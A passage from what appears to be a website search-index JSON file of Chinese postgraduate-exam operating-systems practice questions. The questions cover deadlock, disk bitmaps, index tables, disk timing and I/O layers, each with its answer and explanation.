\u53f0\u8bbe\u5907\u540e\u7cfb\u7edf\u4e2d\u65e0\u53ef\u7528\u7684\u540c\u7c7b\u8bbe\u5907\u5c31\u4f1a\u5f15\u8d77\u6b7b\u9501\uff0c\u5982\u679c\u6b64\u65f6\u80fd\u591a\u51fa\u4e00\u53f0\u540c\u7c7b\u8bbe\u5907\u5c31\u4e0d\u4f1a\u53d1\u751f\u6b7b\u9501\uff0c\u6545\u6700\u5c11\u9700\u89812+3+4+1=10 \u53f0\u540c\u7c7b\u8bbe\u5907\u5c31\u80fd\u4fdd\u8bc1\u7cfb\u7edf\u4e0d\u4f1a\u53d1\u751f\u6b7b\u9501\u3002","title":"2.6. Sat"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_July/#27-sun","text":"\u6d89\u53ca\u67d0\u4e00\u8d44\u6e90\u9020\u6210\u4e0e\u65f6\u95f4\u6709\u5173\u7684\u9519\u8bef\u7684\u539f\u56e0\uff0c\u6b63\u786e\u7684\u662f \u3002\uff3b\u5357\u4eac\u7406\u5de5\u5927\u5b66\uff3d A\uff0e\u4e00\u4e2a\u8fdb\u7a0b\u591a\u6b21\u7533\u8bf7\uff0c\u91ca\u653e\u8be5\u8d44\u6e90 B\uff0e\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u540c\u65f6\u4f7f\u7528\u8be5\u8d44\u6e90 C\uff0e\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u4e92\u65a5\u4f7f\u7528\u8be5\u8d44\u6e90 D\uff0e\u4ee5\u4e0a\u8bf4\u6cd5\u5747\u4e0d\u5bf9 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u4e00\u4e2a\u8fdb\u7a0b\u4e0d\u53ef\u80fd\u5f15\u8d77\u6b7b\u9501\uff0c\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u4e92\u65a5\u7684\u4f7f\u7528\u8d44\u6e90\uff0c\u7cfb\u7edf\u4f1a\u91c7\u7528P\uff0cV\u64cd\u4f5c\u5bf9\u8d44\u6e90\u8fdb\u884c\u7ba1\u7406\uff0c\u56e0\u6b64\u4e5f\u4e0d\u4f1a\u5f15\u8d77\u6b7b\u9501\uff0c\u5bf9B\u9009\u9879\uff0c\u82e5\u4e0d\u52a0\u9650\u5236\uff0c\u82e5\u5e72\u5e76\u53d1\u8fdb\u7a0b\u540c\u65f6\u4f7f\u7528\u8be5\u8d44\u6e90\uff0c\u800c\u8d44\u6e90\u6709\u9650\u65f6\uff0c\u6709\u53ef\u80fd\u4f1a\u9020\u6210\u6b7b\u9501\u3002","title":"2.7. Sun"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/","text":"\u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 Otc # \u76ee\u5f55 # \u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 Otc \u76ee\u5f55 1. Week 1 1. Week 1 # \u73b0\u6709\u5bb9\u91cf\u4e3a10GB\u7684\u78c1\u76d8\u5206\u533a\uff0c\u78c1\u76d8\u7a7a\u95f4\u4ee5\u7c07\uff08cluster\uff09\u4e3a\u5355\u4f4d\u8fdb\u884c\u5206\u914d\uff0c\u7c07\u7684\u5927\u5c0f\u4e3a4KB\uff0c\u82e5\u91c7\u7528\u4f4d\u56fe\u6cd5\u7ba1\u7406\u8be5\u5206\u533a\u7684\u7a7a\u95f2\u7a7a\u95f4\uff0c\u5373\u7528\u4e00\u4f4d\uff08bit\uff09\u6807\u8bc6\u4e00\u4e2a\u7c07\u662f\u5426\u88ab\u5206\u914d\uff0c\u5219\u5b58\u653e\u8be5\u4f4d\u56fe\u6240\u9700\u7c07\u7684\u4e2a\u6570\u4e3a \uff3b\u90d1\u5dde\u5927\u5b66\uff3d A.80 B.320 C.80K D.320K \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u65b9\u6cd5\u4e00\uff1a\u8bbe\u78c1\u76d8\u5bb9\u91cf\u4e3aA,\u5219 A=10G=10*1024 M =10*1024*1024 K =10*1024*1024*1024 byte =10*1024*1024*1024*8 bit \u8bbe\u7c07\u5927\u5c0f\u4e3aB,\u5219 B=4K =4*1024byte =4*1024*8bit \u8bbeC\u4e3a10G\u6240\u9700\u6807\u8bc6\u7684\u4f4d\u6570\uff0c\u5219 C=A/B =320K 320K/4K=80\u4e2a \u65b9\u6cd5\u4e8c\uff1a \u78c1\u76d8\u7c07\u4e2a\u6570\uff1a10*1024*1024KB/4KB=2621440bit\uff0c \u4e00\u4e2a\u7c07\u80fd\u5bb9\u7eb3\u7684bit\u6570\uff1a4*1024*8= 32768bit \u5219\u5b58\u653e\u8be5\u4f4d\u56fe\u6240\u9700\u7c07\u7684\u4e2a\u6570 2621440/ 32768=80\u4e2a\u7c07\u3002","title":"2020 Otc"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/#2020-otc","text":"","title":"\u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 Otc"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/#_1","text":"\u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 Otc \u76ee\u5f55 1. Week 1","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Otc/#1-week-1","text":"\u73b0\u6709\u5bb9\u91cf\u4e3a10GB\u7684\u78c1\u76d8\u5206\u533a\uff0c\u78c1\u76d8\u7a7a\u95f4\u4ee5\u7c07\uff08cluster\uff09\u4e3a\u5355\u4f4d\u8fdb\u884c\u5206\u914d\uff0c\u7c07\u7684\u5927\u5c0f\u4e3a4KB\uff0c\u82e5\u91c7\u7528\u4f4d\u56fe\u6cd5\u7ba1\u7406\u8be5\u5206\u533a\u7684\u7a7a\u95f2\u7a7a\u95f4\uff0c\u5373\u7528\u4e00\u4f4d\uff08bit\uff09\u6807\u8bc6\u4e00\u4e2a\u7c07\u662f\u5426\u88ab\u5206\u914d\uff0c\u5219\u5b58\u653e\u8be5\u4f4d\u56fe\u6240\u9700\u7c07\u7684\u4e2a\u6570\u4e3a \uff3b\u90d1\u5dde\u5927\u5b66\uff3d A.80 B.320 C.80K D.320K \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u65b9\u6cd5\u4e00\uff1a\u8bbe\u78c1\u76d8\u5bb9\u91cf\u4e3aA,\u5219 A=10G=10*1024 M =10*1024*1024 K =10*1024*1024*1024 byte =10*1024*1024*1024*8 bit \u8bbe\u7c07\u5927\u5c0f\u4e3aB,\u5219 B=4K =4*1024byte =4*1024*8bit \u8bbeC\u4e3a10G\u6240\u9700\u6807\u8bc6\u7684\u4f4d\u6570\uff0c\u5219 C=A/B =320K 320K/4K=80\u4e2a \u65b9\u6cd5\u4e8c\uff1a \u78c1\u76d8\u7c07\u4e2a\u6570\uff1a10*1024*1024KB/4KB=2621440bit\uff0c \u4e00\u4e2a\u7c07\u80fd\u5bb9\u7eb3\u7684bit\u6570\uff1a4*1024*8= 32768bit \u5219\u5b58\u653e\u8be5\u4f4d\u56fe\u6240\u9700\u7c07\u7684\u4e2a\u6570 2621440/ 32768=80\u4e2a\u7c07\u3002","title":"1. Week 1"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/","text":"\u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 Sep # \u76ee\u5f55 # \u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 Sep \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Wed 2. Week 4 2.1. Wed 2.2. Sun 1. Week 3 # 1.1. Wed # \u67d0\u7cfb\u7edf\u4e2d\u670911\u53f0\u6253\u5370\u673a\uff0cN\u4e2a\u8fdb\u7a0b\u5171\u4eab\u6253\u5370\u673a\u8d44\u6e90\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u8981\u6c423\u53f0\uff0c\u5f53N\u7684\u53d6\u503c\u4e0d\u8d85\u8fc7 \u65f6\u7cfb\u7edf\u4e0d\u4f1a\u53d1\u751f\u6b7b\u9501\u3002\uff3b\u4e0a\u6d77\u4ea4\u901a\u5927\u5b66\uff3d A. 4 B. 5 C. 6 D. 7 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u4e0d\u53d1\u751f\u6b7b\u9501\u7684\u6761\u4ef6\u662f\u81f3\u5c11\u80fd\u4fdd\u8bc1\u4e00\u4e2a\u8fdb\u7a0b\u80fd\u83b7\u5f97\u4e09\u53f0\u6253\u5370\u673a\u8d44\u6e90\u3002\u6700\u574f\u7684\u60c5\u51b5\u662f1\u4e2a\u8fdb\u7a0b\u83b7\u53d6\u4e09\u53f0\u6253\u5370\u673a\u8d44\u6e90\uff0c\u53e6\u5916N-1\u4e2a\u8fdb\u7a0b\u83b7\u53d6\u5230\u4e24\u53f0\u6253\u5370\u673a\uff0c\u7b49\u5f85\u83b7\u53d6\u7b2c\u4e09\u53f0\u30023+\uff08N-1\uff09*2=11\uff0cN=5\u3002 1.2. Wed # \u4e0b\u5217\u5173\u4e8e\u7d22\u5f15\u8868\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f______\u3002\uff3b\u56db\u5ddd\u5927\u5b66\uff3d A\uff0e\u5efa\u7acb\u7d22\u5f15\u8868\u7684\u76ee\u7684\u4e4b\u4e00\u662f\u4e3a\u4e86\u51cf\u5c11\u5b58\u50a8\u7a7a\u95f4 B\uff0e\u7d22\u5f15\u8868\u4e2d\u542b\u6709\u7d22\u5f15\u6587\u4ef6\u7684\u6570\u636e\u53ca\u5176\u7269\u7406\u5730\u5740 C\uff0e\u5bf9\u7d22\u5f15\u6587\u4ef6\u5b58\u53d6\u65f6\uff0c\u5fc5\u987b\u5148\u67e5\u627e\u7d22\u5f15\u8868 D\uff0e\u7d22\u5f15\u8868\u4e2d\u6bcf\u4e2a\u8bb0\u5f55\u7684\u7d22\u5f15\u9879\u53ef\u4ee5\u6709\u591a\u4e2a \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u76ee\u524d\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\u5e38\u91c7\u7528\u7684\u5b58\u50a8\u7ed3\u6784\u6587\u4ef6\u6709\uff1a\u987a\u5e8f\u6587\u4ef6(\u8fde\u7eed\u6587\u4ef6)\u3001\u94fe\u63a5\u6587\u4ef6(\u4e32\u8fde\u6587\u4ef6)\u548c\u7d22\u5f15\u6587\u4ef6(\u968f\u673a\u6587\u4ef6)\u3002 \u5176\u4e2d\uff0c\u7d22\u5f15\u6587\u4ef6\u662f\u4e00\u79cd\u6587\u4ef6\u5b58\u50a8\u4e0d\u8fdb\u884c\u8fde\u7eed\u5206\u914d\u7684\u65b9\u5f0f\uff0c\u6587\u4ef6\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u6587\u4ef6\u5efa\u7acb\u4e00\u5f20\u6279\u793a\u903b\u8f91\u8bb0\u5f55\u548c\u7269\u7406\u5757\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\u7684\u8868\uff0c\u79f0\u4e3a\u7d22\u5f15\u8868\uff0c\u6587\u4ef6\u672c\u8eab\u548c\u7d22\u5f15\u8868\u7ec4\u6210\u7684\u6587\u4ef6\u79f0\u4e3a\u7d22\u5f15\u6587\u4ef6\u3002\u7d22\u5f15\u8868\u4e2d\u6bcf\u4e00\u9879\u79f0\u4e3a\u7d22\u5f15\u9879\uff0c\u6bcf\u4e2a\u8bb0\u5f55\u5360\u4e00\u4e2a\u7d22\u5f15\u9879\uff0c\u7d22\u5f15\u9879\u4e2d\u542b\u6709\u8bb0\u5f55\u7684\u903b\u8f91\u53f7\u548c\u5b58\u653e\u8bb0\u5f55\u7684\u7269\u7406\u5730\u5740\u3002\u5bf9\u7d22\u5f15\u6587\u4ef6\u7684\u5b58\u50a8\u9996\u5148\u67e5\u627e\u7d22\u5f15\u8868\uff0c\u7136\u540e\u6839\u636e\u7d22\u5f15\u9879\u7684\u5730\u5740\u5b58\u50a8\u76f8\u5e94\u7684\u7269\u7406\u5757\u3002\u7d22\u5f15\u6587\u4ef6\u7684\u4f18\u70b9\u662f\u53ea\u987b\u77e5\u9053\u7d22\u5f15\u8868\u7684\u9996\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u65b9\u4fbf\u5730\u5bf9\u6587\u4ef6\u8fdb\u884c\u76f4\u63a5\u548c\u987a\u5e8f\u5b58\u53d6\uff0c\u65b9\u4fbf\u6587\u4ef6\u64cd\u4f5c\u3002\u4f46\u7d22\u5f15\u8868\u7684\u5efa\u7acb\u4f1a\u5360\u7528\u989d\u5916\u7684\u5b58\u50a8\u7a7a\u95f4\u548c\u8bbf\u95ee\u65f6\u95f4\uff0c\u4e3a\u6b64\u53ef\u91c7\u7528\u591a\u7ea7\u7d22\u5f15\u7ed3\u6784\u3002 \u7efc\u4e0a\u6240\u8ff0\uff0c\u5efa\u7acb\u7d22\u5f15\u8868\u7684\u76ee\u7684\u662f\u51cf\u5c11\u5b58\u50a8\u7a7a\u95f4\uff0c\u663e\u7136\u662f\u4e0d\u6b63\u786e\u7684\u3002\u5bf9\u7d22\u5f15\u6587\u4ef6\u5b58\u53d6\u65f6\u5fc5\u987b\u5148\u67e5\u627e\u7d22\u5f15\u8868\u65b9\u80fd\u77e5\u9053\u903b\u8f91\u8bb0\u5f55\u6240\u5bf9\u5e94\u7684\u7269\u7406\u5757\u53f7\uff0c\u5373\u7269\u7406\u5730\u5740\uff0c\u8fdb\u800c\u624d\u53ef\u8bbf\u95ee\u6587\u4ef6\u3002 2. Week 4 # 2.1. Wed # \u8bbe\u78c1\u76d8\u7684\u8f6c\u901f\u4e3a3000\u8f6c/\u5206\uff0c\u76d8\u9762\u5212\u5206\u621010\u4e2a\u6247\u533a\uff0c\u5219\u8bfb\u53d6\u4e00\u4e2a\u6247\u533a\u7684\u65f6\u95f4\u4e3a \uff3b\u5357\u4eac\u5927\u5b66845\uff3d A\uff0e20ms B\uff0e5ms C\uff0e2ms D\uff0e1ms \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u7531\u9898\u76ee\u53ef\u77e5\uff0c\u78c1\u76d8\u7684\u8f6c\u901f\u4e3a3000\u8f6c/\u5206\uff0c\u8fd9\u8868\u793a\u5728\u5355\u4f4d\u65f6\u95f4\u5185\uff0c\u78c1\u76d8\u53ef\u4ee5\u8f6c\u52a83000\u8f6c\uff0c\u82e5\u4ee5\u79d2\u4e3a\u5355\u4f4d\u65f6\uff0c\u5c31\u662f1\u79d250\u8f6c\u3002\u53c8\u56e0\u4e3a\u76d8\u9762\u5212\u5206\u4e3a10\u4e2a\u6247\u533a\uff0c\u8fd9\u4f7f\u5f97\u4e00\u79d2\u5185\u78c1\u5934\u8bfb\u53d6\u4e8650\u00d710=500\u4e2a\u6247\u533a\u3002\u6240\u4ee5\u8bfb\u53d6\u4e00\u4e2a\u6247\u533a\u7684\u65f6\u95f4\u4e3a1/500\u79d2=0.002\u79d2=2ms\u3002 2.2. Sun # \u64cd\u4f5c\u7cfb\u7edf\u7684 I/O \u5b50\u7cfb\u7edf\u901a\u5e38\u7531\u56db\u4e2a\u5c42\u6b21\u7ec4\u6210\uff0c\u6bcf\u4e00\u5c42\u660e\u786e\u5b9a\u4e49\u4e86\u4e0e\u90bb\u8fd1\u5c42\u6b21\u7684\u63a5\u53e3\u3002\u5176\u5408\u7406\u7684\u5c42\u6b21\u7ec4\u7ec7\u6392\u5217\u987a\u5e8f\u662f \uff3b\u90d1\u5dde\u5927\u5b66\uff3d A\uff0e\u7528\u6237\u7ea7 I/O \u8f6f\u4ef6\u3001\u8bbe\u5907\u65e0\u5173\u8f6f\u4ef6\u3001\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u3001\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f B\uff0e\u7528\u6237\u7ea7 I/O \u8f6f\u4ef6\u3001\u8bbe\u5907\u65e0\u5173\u8f6f\u4ef6\u3001\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3001\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f C\uff0e\u7528\u6237\u7ea7 I/O \u8f6f\u4ef6\u3001\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u3001\u8bbe\u5907\u65e0\u5173\u8f6f\u4ef6\u3001\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f D\uff0e\u7528\u6237\u7ea7 I/O \u8f6f\u4ef6\u3001\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3001\u8bbe\u5907\u65e0\u5173\u8f6f\u4ef6\u3001\u8bbe\u5907\u9a71\u52a8\u7a0b \u7b54\u6848 \u7b54\u6848\uff1aA \u89e3\u6790\uff1a\u8f93\u5165/\u8f93\u51fa\u8f6f\u4ef6\u4e00\u822c\u4ece\u4e0a\u5230\u4e0b\u5206\u4e3a\u56db\u4e2a\u5c42\u6b21\uff1a\u7528\u6237\u5c42\u3001\u4e0e\u8bbe\u5907\u65e0\u5173\u7684\u8f6f\u4ef6 \u5c42\u3001\u8bbe\u5907\u9a71\u52a8\u7a0b\u5e8f\u4ee5\u53ca\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u3002\u4e0e\u8bbe\u5907\u65e0\u5173\u7684\u8f6f\u4ef6\u5c42\u4e5f\u5c31\u662f\u7cfb\u7edf\u8c03\u7528\u7684\u5904\u7406\u7a0b\u5e8f","title":"2020 Sep"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#2020-sep","text":"","title":"\u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 Sep"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#_1","text":"\u64cd\u4f5c\u7cfb\u7edf\u6bcf\u65e5\u4e00\u9898 2020 Sep \u76ee\u5f55 1. Week 3 1.1. Wed 1.2. Wed 2. Week 4 2.1. Wed 2.2. Sun","title":"\u76ee\u5f55"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#1-week-3","text":"","title":"1. Week 3"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#11-wed","text":"\u67d0\u7cfb\u7edf\u4e2d\u670911\u53f0\u6253\u5370\u673a\uff0cN\u4e2a\u8fdb\u7a0b\u5171\u4eab\u6253\u5370\u673a\u8d44\u6e90\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u8981\u6c423\u53f0\uff0c\u5f53N\u7684\u53d6\u503c\u4e0d\u8d85\u8fc7 \u65f6\u7cfb\u7edf\u4e0d\u4f1a\u53d1\u751f\u6b7b\u9501\u3002\uff3b\u4e0a\u6d77\u4ea4\u901a\u5927\u5b66\uff3d A. 4 B. 5 C. 6 D. 7 \u7b54\u6848 \u7b54\u6848\uff1aB \u89e3\u6790\uff1a\u4e0d\u53d1\u751f\u6b7b\u9501\u7684\u6761\u4ef6\u662f\u81f3\u5c11\u80fd\u4fdd\u8bc1\u4e00\u4e2a\u8fdb\u7a0b\u80fd\u83b7\u5f97\u4e09\u53f0\u6253\u5370\u673a\u8d44\u6e90\u3002\u6700\u574f\u7684\u60c5\u51b5\u662f1\u4e2a\u8fdb\u7a0b\u83b7\u53d6\u4e09\u53f0\u6253\u5370\u673a\u8d44\u6e90\uff0c\u53e6\u5916N-1\u4e2a\u8fdb\u7a0b\u83b7\u53d6\u5230\u4e24\u53f0\u6253\u5370\u673a\uff0c\u7b49\u5f85\u83b7\u53d6\u7b2c\u4e09\u53f0\u30023+\uff08N-1\uff09*2=11\uff0cN=5\u3002","title":"1.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#12-wed","text":"\u4e0b\u5217\u5173\u4e8e\u7d22\u5f15\u8868\u7684\u53d9\u8ff0\u4e2d\uff0c\u6b63\u786e\u7684\u662f______\u3002\uff3b\u56db\u5ddd\u5927\u5b66\uff3d A\uff0e\u5efa\u7acb\u7d22\u5f15\u8868\u7684\u76ee\u7684\u4e4b\u4e00\u662f\u4e3a\u4e86\u51cf\u5c11\u5b58\u50a8\u7a7a\u95f4 B\uff0e\u7d22\u5f15\u8868\u4e2d\u542b\u6709\u7d22\u5f15\u6587\u4ef6\u7684\u6570\u636e\u53ca\u5176\u7269\u7406\u5730\u5740 C\uff0e\u5bf9\u7d22\u5f15\u6587\u4ef6\u5b58\u53d6\u65f6\uff0c\u5fc5\u987b\u5148\u67e5\u627e\u7d22\u5f15\u8868 D\uff0e\u7d22\u5f15\u8868\u4e2d\u6bcf\u4e2a\u8bb0\u5f55\u7684\u7d22\u5f15\u9879\u53ef\u4ee5\u6709\u591a\u4e2a \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u76ee\u524d\uff0c\u64cd\u4f5c\u7cfb\u7edf\u7684\u6587\u4ef6\u7cfb\u7edf\u4e2d\u5e38\u91c7\u7528\u7684\u5b58\u50a8\u7ed3\u6784\u6587\u4ef6\u6709\uff1a\u987a\u5e8f\u6587\u4ef6(\u8fde\u7eed\u6587\u4ef6)\u3001\u94fe\u63a5\u6587\u4ef6(\u4e32\u8fde\u6587\u4ef6)\u548c\u7d22\u5f15\u6587\u4ef6(\u968f\u673a\u6587\u4ef6)\u3002 \u5176\u4e2d\uff0c\u7d22\u5f15\u6587\u4ef6\u662f\u4e00\u79cd\u6587\u4ef6\u5b58\u50a8\u4e0d\u8fdb\u884c\u8fde\u7eed\u5206\u914d\u7684\u65b9\u5f0f\uff0c\u6587\u4ef6\u7cfb\u7edf\u4e3a\u6bcf\u4e2a\u6587\u4ef6\u5efa\u7acb\u4e00\u5f20\u6279\u793a\u903b\u8f91\u8bb0\u5f55\u548c\u7269\u7406\u5757\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\u7684\u8868\uff0c\u79f0\u4e3a\u7d22\u5f15\u8868\uff0c\u6587\u4ef6\u672c\u8eab\u548c\u7d22\u5f15\u8868\u7ec4\u6210\u7684\u6587\u4ef6\u79f0\u4e3a\u7d22\u5f15\u6587\u4ef6\u3002\u7d22\u5f15\u8868\u4e2d\u6bcf\u4e00\u9879\u79f0\u4e3a\u7d22\u5f15\u9879\uff0c\u6bcf\u4e2a\u8bb0\u5f55\u5360\u4e00\u4e2a\u7d22\u5f15\u9879\uff0c\u7d22\u5f15\u9879\u4e2d\u542b\u6709\u8bb0\u5f55\u7684\u903b\u8f91\u53f7\u548c\u5b58\u653e\u8bb0\u5f55\u7684\u7269\u7406\u5730\u5740\u3002\u5bf9\u7d22\u5f15\u6587\u4ef6\u7684\u5b58\u50a8\u9996\u5148\u67e5\u627e\u7d22\u5f15\u8868\uff0c\u7136\u540e\u6839\u636e\u7d22\u5f15\u9879\u7684\u5730\u5740\u5b58\u50a8\u76f8\u5e94\u7684\u7269\u7406\u5757\u3002\u7d22\u5f15\u6587\u4ef6\u7684\u4f18\u70b9\u662f\u53ea\u987b\u77e5\u9053\u7d22\u5f15\u8868\u7684\u9996\u5730\u5740\uff0c\u5c31\u53ef\u4ee5\u65b9\u4fbf\u5730\u5bf9\u6587\u4ef6\u8fdb\u884c\u76f4\u63a5\u548c\u987a\u5e8f\u5b58\u53d6\uff0c\u65b9\u4fbf\u6587\u4ef6\u64cd\u4f5c\u3002\u4f46\u7d22\u5f15\u8868\u7684\u5efa\u7acb\u4f1a\u5360\u7528\u989d\u5916\u7684\u5b58\u50a8\u7a7a\u95f4\u548c\u8bbf\u95ee\u65f6\u95f4\uff0c\u4e3a\u6b64\u53ef\u91c7\u7528\u591a\u7ea7\u7d22\u5f15\u7ed3\u6784\u3002 \u7efc\u4e0a\u6240\u8ff0\uff0c\u5efa\u7acb\u7d22\u5f15\u8868\u7684\u76ee\u7684\u662f\u51cf\u5c11\u5b58\u50a8\u7a7a\u95f4\uff0c\u663e\u7136\u662f\u4e0d\u6b63\u786e\u7684\u3002\u5bf9\u7d22\u5f15\u6587\u4ef6\u5b58\u53d6\u65f6\u5fc5\u987b\u5148\u67e5\u627e\u7d22\u5f15\u8868\u65b9\u80fd\u77e5\u9053\u903b\u8f91\u8bb0\u5f55\u6240\u5bf9\u5e94\u7684\u7269\u7406\u5757\u53f7\uff0c\u5373\u7269\u7406\u5730\u5740\uff0c\u8fdb\u800c\u624d\u53ef\u8bbf\u95ee\u6587\u4ef6\u3002","title":"1.2. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#2-week-4","text":"","title":"2. Week 4"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#21-wed","text":"\u8bbe\u78c1\u76d8\u7684\u8f6c\u901f\u4e3a3000\u8f6c/\u5206\uff0c\u76d8\u9762\u5212\u5206\u621010\u4e2a\u6247\u533a\uff0c\u5219\u8bfb\u53d6\u4e00\u4e2a\u6247\u533a\u7684\u65f6\u95f4\u4e3a \uff3b\u5357\u4eac\u5927\u5b66845\uff3d A\uff0e20ms B\uff0e5ms C\uff0e2ms D\uff0e1ms \u7b54\u6848 \u7b54\u6848\uff1aC \u89e3\u6790\uff1a\u7531\u9898\u76ee\u53ef\u77e5\uff0c\u78c1\u76d8\u7684\u8f6c\u901f\u4e3a3000\u8f6c/\u5206\uff0c\u8fd9\u8868\u793a\u5728\u5355\u4f4d\u65f6\u95f4\u5185\uff0c\u78c1\u76d8\u53ef\u4ee5\u8f6c\u52a83000\u8f6c\uff0c\u82e5\u4ee5\u79d2\u4e3a\u5355\u4f4d\u65f6\uff0c\u5c31\u662f1\u79d250\u8f6c\u3002\u53c8\u56e0\u4e3a\u76d8\u9762\u5212\u5206\u4e3a10\u4e2a\u6247\u533a\uff0c\u8fd9\u4f7f\u5f97\u4e00\u79d2\u5185\u78c1\u5934\u8bfb\u53d6\u4e8650\u00d710=500\u4e2a\u6247\u533a\u3002\u6240\u4ee5\u8bfb\u53d6\u4e00\u4e2a\u6247\u533a\u7684\u65f6\u95f4\u4e3a1/500\u79d2=0.002\u79d2=2ms\u3002","title":"2.1. Wed"},{"location":"%E8%80%83%E7%A0%94%E7%AC%94%E8%AE%B0/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E4%B9%A0%E9%A2%98/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2020_Sep/#22-sun","text":"\u64cd\u4f5c\u7cfb\u7edf\u7684 I/O \u5b50\u7cfb\u7edf\u901a\u5e38\u7531\u56db\u4e2a\u5c42\u6b21\u7ec4\u6210\uff0c\u6bcf\u4e00\u5c42\u660e\u786e\u5b9a\u4e49\u4e86\u4e0e\u90bb\u8fd1\u5c42\u6b21\u7684\u63a5\u53e3\u3002\u5176\u5408\u7406\u7684\u5c42\u6b21\u7ec4\u7ec7\u6392\u5217\u987a\u5e8f\u662f \uff3b\u90d1\u5dde\u5927\u5b66\uff3d A\uff0e\u7528\u6237\u7ea7 I/O 